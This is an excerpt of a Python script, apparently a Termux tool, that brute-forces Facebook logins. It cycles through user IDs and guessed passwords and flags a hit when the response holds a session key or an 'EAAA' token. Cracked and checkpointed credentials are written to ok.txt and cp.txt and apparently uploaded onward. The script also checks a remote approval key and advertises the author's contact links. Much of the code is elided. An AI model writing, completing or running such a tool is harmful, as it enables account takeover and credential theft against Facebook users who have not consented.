...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/nehal.ahmed6"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/nehal.ahmed6")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801613016943")
	subprocess.check_output(["am", "start", "https://wa.me/+8801613016943"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/weirdnehal/OLD/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;96m##    ## ######## ##     ## ##     ## ######## 
 ...
 > \033[0;92mDEVELOPER     : NEHAL AHMED
 > \033[0;95mFACEBOOK ID   : Nehal Ahmed
 > \033[0;41mWHATSAPP      : +8801613016943
 \033[0;96m> YOUTUBE       : Clay-404
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Nehal): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [NEHAL] : %s/%s -> \033[0;92m [ NEHAL-OK:%s ]- \033[0;93m[NEHAL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[NEHAL-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [NEHAL-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[NEHAL-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [NEHAL-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
